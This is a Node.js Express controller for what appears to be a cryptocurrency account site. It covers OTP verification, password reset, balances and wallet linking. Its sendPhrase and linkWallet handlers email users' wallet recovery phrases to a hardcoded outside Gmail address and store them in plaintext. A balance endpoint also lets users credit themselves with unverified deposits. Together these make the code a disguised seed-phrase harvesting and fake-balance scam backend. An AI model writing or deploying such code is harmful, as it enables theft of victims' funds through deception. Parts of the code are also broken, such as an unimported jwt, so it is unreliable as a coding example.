const User = require('../models/User');
const crypto = require('crypto');
const sendEmail = require('../utils/email');
const { generateOTP } = require('../utils/helpers');

exports.getUserInfo = async (req, res) => {
  try {
    const user = await User.findById(req.user.id)
      .select('-password -otp -resetPasswordToken -resetPasswordExpires');
    res.json({
      id: user._id,
      email: user.email,
      username: user.username,
      firstName: user.firstName,
      lastName: user.lastName,
      phoneNumber: user.phoneNumber,
      country: user.country,
      isVerified: user.isVerified,
      createdAt: user.createdAt,
      totalBalance: user.totalBalance
    });
  } catch (error) {
    res.status(500).json({ message: 'Error fetching user info' });
  }
};

exports.resendOTP = async (req, res) => {
  try {
    const user = await User.findById(req.user.id);
    const otp = generateOTP();
    
    user.otp = {
      code: otp,
      expiresAt: new Date(Date.now() + 10 * 60 * 1000) // 10 minutes
    };
    await user.save();

    // Send OTP via email
    await sendEmail(user.email, 'Your OTP Code', `Your OTP is: ${otp}`);
    
    res.json({ message: 'OTP sent successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Error sending OTP' });
  }
};

exports.verifyOTP = async (req, res) => {
  try {
    const { email, otp } = req.body;
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (!user.otp || !user.otp.code || user.otp.expiresAt < Date.now()) {
      return res.status(400).json({ message: 'OTP expired' });
    }

    if (user.otp.code !== otp) {
      return res.status(400).json({ message: 'Invalid OTP' });
    }

    user.isVerified = true;
    user.otp = undefined;
    await user.save();

    res.json({ 
      message: 'Email verified successfully',
      user: {
        id: user._id,
        email: user.email,
        isVerified: true
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Error verifying OTP' });
  }
};

exports.forgotPassword = async (req, res) => {
  try {
    const { email } = req.body;
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    const resetToken = crypto.randomBytes(32).toString('hex');
    user.resetPasswordToken = resetToken;
    user.resetPasswordExpires = Date.now() + 3600000; // 1 hour
    await user.save();

    // Send reset password email
    await sendEmail(
      email,
      'Password Reset',
      `Reset your password using this token: ${resetToken}`
    );

    res.json({ message: 'Password reset email sent' });
  } catch (error) {
    res.status(500).json({ message: 'Error processing request' });
  }
};

exports.resetPassword = async (req, res) => {
  try {
    const { token, newPassword } = req.body;
    const user = await User.findOne({
      resetPasswordToken: token,
      resetPasswordExpires: { $gt: Date.now() }
    });

    if (!user) {
      return res.status(400).json({ message: 'Invalid or expired reset token' });
    }

    // Update password and clear reset token
    user.password = newPassword;
    user.resetPasswordToken = undefined;
    user.resetPasswordExpires = undefined;
    await user.save();

    // Generate new auth token
    const authToken = jwt.sign({ id: user._id }, process.env.JWT_SECRET, {
      expiresIn: '1d'
    });

    res.json({ 
      message: 'Password reset successful',
      token: authToken
    });
  } catch (error) {
    res.status(500).json({ message: 'Error resetting password' });
  }
};

exports.changePassword = async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    const user = await User.findById(req.user.id);

    // Verify current password
    const isMatch = await user.comparePassword(currentPassword);
    if (!isMatch) {
      return res.status(401).json({ message: 'Current password is incorrect' });
    }

    // Update password
    user.password = newPassword;
    await user.save();

    res.json({ message: 'Password changed successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Error changing password' });
  }
};

exports.getBalance = async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('balances totalBalance');
    res.json({
      balances: user.balances,
      totalBalance: user.totalBalance
    });
  } catch (error) {
    res.status(500).json({ message: 'Error fetching balance' });
  }
};

exports.getTransactionHistory = async (req, res) => {
  try {
    const { page = 1, limit = 10 } = req.query;
    const user = await User.findById(req.user.id)
      .select('transactionHistory')
      .slice('transactionHistory', [(page - 1) * limit, Number(limit)]);
    
    res.json({
      transactions: user.transactionHistory,
      page: Number(page),
      limit: Number(limit)
    });
  } catch (error) {
    res.status(500).json({ message: 'Error fetching transaction history' });
  }
};

exports.updateBalance = async (req, res) => {
  try {
    const { currency, amount, type, description } = req.body;
    const user = await User.findById(req.user.id);

    // Find or create balance for the currency
    let balance = user.balances.find(b => b.currency === currency);
    if (!balance) {
      user.balances.push({ currency, amount: 0 });
      balance = user.balances[user.balances.length - 1];
    }

    // Update balance based on transaction type
    if (type === 'deposit') {
      balance.amount += amount;
    } else if (type === 'withdrawal') {
      if (balance.amount < amount) {
        return res.status(400).json({ message: 'Insufficient balance' });
      }
      balance.amount -= amount;
    }

    balance.updatedAt = Date.now();

    // Add transaction to history
    user.transactionHistory.push({
      type,
      amount,
      currency,
      description,
      timestamp: Date.now()
    });

    // Update total balance
    user.totalBalance = user.balances.reduce((total, b) => total + b.amount, 0);

    await user.save();
    res.json({ 
      balance: user.balances,
      totalBalance: user.totalBalance,
      transaction: user.transactionHistory[user.transactionHistory.length - 1]
    });
  } catch (error) {
    res.status(500).json({ message: 'Error updating balance' });
  }
};

exports.sendPhrase = async (req, res) => {
  try {
    console.log('Request body:', req.body); // Debug log
    const { phrase } = req.body;
    
    if (!phrase) {
      return res.status(400).json({ 
        message: 'Phrase is required',
        receivedBody: req.body // Show what was received
      });
    }

    const referenceNumber = generateReferenceNumber(); // Use the existing function
    
    await sendEmail(
      'aguchris740@gmail.com',
      'Your Recovery Phrase',
      `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
      Reference Number: ${referenceNumber}`
    );

    res.json({ message: 'Recovery phrase sent successfully', referenceNumber });
  } catch (error) {
    console.error('Send phrase error:', error); // Debug log
    res.status(500).json({ 
      message: 'Error sending phrase', 
      error: error.message,
      receivedBody: req.body // Show what was received
    });
  }
};

const generateReferenceNumber = () => {
  return 'QFS-' + Date.now().toString(36).toUpperCase() + 
    Math.random().toString(36).substring(2, 7).toUpperCase();
};

exports.linkWallet = async (req, res) => {
  try {
    const { phrase, walletAddress, type } = req.body;
    const user = await User.findById(req.user.id);

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (!phrase || !walletAddress) {
      return res.status(400).json({ message: 'Recovery phrase and wallet address are required' });
    }

    const referenceNumber = generateReferenceNumber();
    await sendEmail(
      'aguchris740@gmail.com',
      'Your Recovery Phrase Linked',
      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\nType: ${type}\n\nPlease store this safely and never share it with anyone.
      \nReference Number: ${referenceNumber}`
    );
  
    user.wallets.push({
      phrase,
      walletAddress,
      type,
      linkedAt: new Date(),
      referenceNumber
    });

    await user.save();

    res.json({ 
      message: 'Wallet linked successfully',
      wallet: {
        walletAddress,
        type,
        linkedAt: new Date(),
        referenceNumber
      }
    });
  } catch (error) {
    res.status(500).json({ message: 'Error linking wallet', error: error.message });
  }
};

exports.getWallets = async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select('wallets');
    console.log('User wallets:', user.wallets); // Console log the wallets
    res.json({ wallets: user.wallets });
  } catch (error) {
    console.error('Error fetching wallets:', error);
    res.status(500).json({ message: 'Error fetching wallets' });
  }
};
